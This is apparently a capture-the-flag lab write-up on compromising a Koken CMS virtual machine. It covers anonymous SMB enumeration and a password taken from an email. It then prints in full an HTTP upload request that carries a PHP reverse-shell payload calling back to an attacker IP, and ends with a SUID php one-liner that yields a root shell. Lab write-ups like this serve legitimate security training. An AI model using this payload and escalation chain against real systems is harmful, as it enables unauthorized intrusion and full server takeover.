Found the IP with `netdiscover`

```
192.168.1.175
```

## port 80 

There is a website running Koken

![[Pasted image 20220628122952.png]]

## Port 8000
hosting a different Koken site. This one appears to have already been compromised.
![[Pasted image 20220628123111.png]]


## Port 445

Had a samba share that allows anonymous login. We found a copy of an email with this content
> Message-ID: <4129F3CA.2020509@dc.edu>                 
Date: Mon, 20 Jul 2020 11:40:36 -0400                 
From: Agi Clarence <agi@photographer.com>             
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; e
n-US; rv:1.0.1) Gecko/20020823 Netscape/7.0           
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flo
wed
Content-Transfer-Encoding: 7bit
>
> Hi Daisa!     
Your site is ready now.
Don't forget your secret, my babygirl ;)

From the email we gather the admin's name is `Daisa`, her email address is 

```
daisa@photographer.com
```
and the password may be 
```
babygirl
```

After hunting around we found an exploit for Koken 0.22.24; [EDB-48706](https://www.exploit-db.com/exploits/48706).

In the exploit, we see the admin panel can be found at `target.com/koken/admin`.
According to the exploit, we should be able to upload a reverse shell php payload with `.jpg` extension, and then change it to `php` to get a reverse shell. 
We found this to be slightly incorrect. The correct description, is that a payload is provided in the request with a spoofed content-type header.


Here is the full content of the request I used to gain a reverse shell using the pentest monkey reverse php payload
```web request
POST /koken/api.php?/content HTTP/1.1
Host: 192.168.1.175
Content-Length: 5081
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryusjPIBaZCnX5hxKK
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
x-koken-auth: cookie
Accept: */*
Origin: http://192.168.1.175
Referer: http://192.168.1.175/koken/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: koken_session_ci=pMO4iMnsQwiJxWixw5Jz7ftmkG%2BplyOScVpUbv%2FCGDCvooUs078ZBfklrkuoOeP9QoiZ7QAZYyJi1Z4%2BDD65M9rt4HS5IGwIjv6UKepVgnSup5CpSrlSJkPj9LDmkOrsc49s%2FcJJ%2BW1XbX5PzU8qjL8oMRgjkCKNcNVRcstVXZbuTpIuMx3PL6fLDoGSHx%2Ba5n4iRso%2By%2Bv9tAyYwKmGlCfiix3qosC55l7xVEQtpK7fABXH6EhSPwqlqwex4e1J5rw5a7Ww4kqqff2h8SbPj6uKlN8VzdngfepXTIFHzSgE3LFFUi3jI%2F0DgDv5Lxre338SmpmjYo1b4mivFOUEAwdd8eiYyzObZ33Tw%2Br%2FDSGLwXRASyAYtGNQHYfecefXuU5Hy7aI1G2ZWLDT2aa3uMHgCCw5kBF9TsQPxq%2BclmjUzuGgsnDxAbNpz19OCmRDLiKo3MOxsweYOCmKHan3Iz9IbUMmUZud8KTDHy0rRDxJULgKpCJ5qBGDZz3qeVghORm9lgFLgD9xK0hytEdG49qzAVA18p5bbE7aJFb4q68tQImVuEuUZYcPWTdPG2YX82fNIygIsgQKehc%2FmTdF91KAeg950LpkU3lEDvpIAC%2Fyjub6m%2B%2BZnoco%2FN00O7FTuVh11ezRoipZ6nueXxrAht6dW8jiCrVynT4TwJxbTXMh1yM3dtIWqXvDoDjhO7iAoFVRhOfMH1mWLG4b46W4a2NaNd72jnFNaW2pzoaEA2XmxvPFJd5OQLd9qps1kV%2BYViCNXo5mc4WOC8sUDmYM4OUMN3Ml%2FkRk8jKNW9nx3sDWK%2FoRRUqGk5NjEPCx13k5r%2FE0FbVyICA%2B56qjdvErUM5g1SQ0LXsKkyQaa0opfNFBnAJR7vBzpHKj5Y2M1Pj9fbX7cnJpdRGI%2FdudnK6AONCmFp7%2BlVIzBL6pnVyrl1fsH67d3ugHXegt7YG%2F0wLSTSa4UgZD%2FrHKoP1dyIZ0zNYjAw9mOAbfcJyBBQkG5MknhhAY9eNj5DWZ8%2FMTyJftq1dKI0zQje1f0aseN5XDrh6W4NN68vnUzm0sHIvEWPfNUM7SGgnOPuEiPz35%2BODeZhDyHtEWLCEYu8qcDpztbXLpjiaYBfRDrHlOsauvT15cov%2FcKUXC4HTYC40zK8TwFCwIskL%2FE4no21DJ0%2BRjKoC%2BgAL%2BMKOG2qFJRdnrmHJvIWJ6gTpR%2B1pzrmbeuqwzJlk%2FiBRFR7uPMgbKpDLLvJU2YdunN5GgHmjYBsTrEd68xcqu%2BqE8b%2BEx9zdFvcafWNDfYrgZM%2BodGklnH1FtlZiVST2OPoYffKEbXYYVgX2Bag4qRyd%2FtyUm3d2AqFAi622e869b7becdd70db4afe942458321b54fc5d34
Connection: close

------WebKitFormBoundaryusjPIBaZCnX5hxKK
Content-Disposition: form-data; name="name"

image2.php
------WebKitFormBoundaryusjPIBaZCnX5hxKK
Content-Disposition: form-data; name="chunk"

0
------WebKitFormBoundaryusjPIBaZCnX5hxKK
Content-Disposition: form-data; name="chunks"

1
------WebKitFormBoundaryusjPIBaZCnX5hxKK
Content-Disposition: form-data; name="upload_session_start"

1656460957
------WebKitFormBoundaryusjPIBaZCnX5hxKK
Content-Disposition: form-data; name="visibility"

public
------WebKitFormBoundaryusjPIBaZCnX5hxKK
Content-Disposition: form-data; name="license"

all
------WebKitFormBoundaryusjPIBaZCnX5hxKK
Content-Disposition: form-data; name="max_download"

none
------WebKitFormBoundaryusjPIBaZCnX5hxKK
Content-Disposition: form-data; name="file"; filename="image2.php"
Content-Type: image/jpeg

<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.1.109';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>

------WebKitFormBoundaryusjPIBaZCnX5hxKK--

```

We have a shell as `www-data`

Go User Flag

![[Pasted image 20220628192248.png]]

## Privilege Escalation

Tried to `su` using known password for daisa, didn't work.

linpeas identified `php7.2` as having the SUID bit set. This was not immediately evident, so I had to cheat by loooking up the answer on a walkthrough.

Once we saw the SUID bit, we made use of [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid)

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

This gives us a root shell.

![[Pasted image 20220628195102.png]]
